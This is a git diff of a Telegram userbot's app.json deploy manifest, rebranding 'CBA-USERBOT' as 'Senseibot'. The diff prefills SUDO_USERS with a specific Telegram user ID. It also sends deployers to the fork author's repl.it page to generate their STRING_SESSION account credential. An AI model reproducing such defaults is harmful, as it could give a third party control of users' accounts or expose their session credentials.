@@ -1,7 +1,7 @@
 {
-  "name": "CBA-USERBOT",
-  "description": "Userbot created by a @CyberBoyAyush",
-  "logo": "https://telegra.ph/file/fc3aef09eb9b82d244f97.jpg",
+  "name": "Senseibot",
+  "description": "The G.O.A.T. userbot created by @sensei_nex for boosting your tg experience",
+  "logo": "https://telegra.ph/file/f7c3fd286065b88f84937.jpg",
     "keywords": [
     "telegram",
     "userbot",
@@ -9,7 +9,7 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/CyberBoyAyush/CBA-Userbot",
+  "repository": "https://github.com/SenseiOfficial/Sensei-BOT",
   "website": "#TODO",
   "success_url": "#TODO",
   "env": {
@@ -28,38 +28,44 @@
       "required": false
     },
     "ALIVE_NAME": {
-      "description": "Fill your Full name or Username like @CyberBoyAyush.",
+      "description": "Fill your Full name or Username like @Sensei_nex.",
       "value": ""
     },
     "APP_ID": {
-      "description": "Get this value from my.telegram.org! Please do not steal",
+      "description": "Get this value from my.telegram.org or @ApiHashBot! Please do not steal",
       "value": ""
     },
-    "REM_BG_API_KEY": {
+     "API_HASH": {
+      "description": "Get this value from my.telegram.org or @ApiHashBot! Please do not steal",
+      "value": ""
+
+     },
+      "REM_BG_API_KEY": {
       "description": "Required for Removing image background functionality. Get from https://www.remove.bg/",
       "value": "",
       "required": false
+
     },
     "LYDIA_API_KEY": {
       "description": "Needed for Lydia AI. Follow https://telegra.ph/Lydia-09-05 to get your API.",
       "value": "",
       "required": false
-    },
-    "API_HASH": {
-      "description": "Get this value from my.telegram.org! Please do not steal",
-      "value": ""
+
     },
     "PLUGIN_CHANNEL": {
       "description": "Create a private group add rose  then type /id. PLUGIN_CHANNEL and PRIVATE_GROUP_ID both values should be same",
       "value": ""
+
     },
     "PRIVATE_GROUP_ID": {
       "description": "Create a private group add rose bot then type /id. PLUGIN_CHANNEL and PRIVATE_GROUP_ID both values should be same",
       "value": ""
+
     },
     "STRING_SESSION": {
-      "description": "Get this value from https://cba-userbot.cyberboyayush.repl.run/",
+      "description": "Get this value from https://repl.it/@SenseiOfficial/String-Session-1/",
       "value": ""
+
     },
     "GITHUB_ACCESS_TOKEN": {
       "description": "Your Github Access Token for gitcommit plugin.Google 'Github access token' to find.",
@@ -67,7 +73,7 @@
       "required": false
     },
     "GIT_REPO_NAME": {
-      "description": "Your repo name Example: midhunkm1294/Friday, but GITHUB_ACCESS_TOKEN must be setup first.",
+      "description": "Your repo name Example: SenseiOfficial/Sensei-BOT, but GITHUB_ACCESS_TOKEN must be setup first.",
       "value": "",
       "required": false
     },
@@ -90,7 +96,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "813878981",
+      "value": "1343556834",
       "required": false
     },
     "CHROME_BIN": {
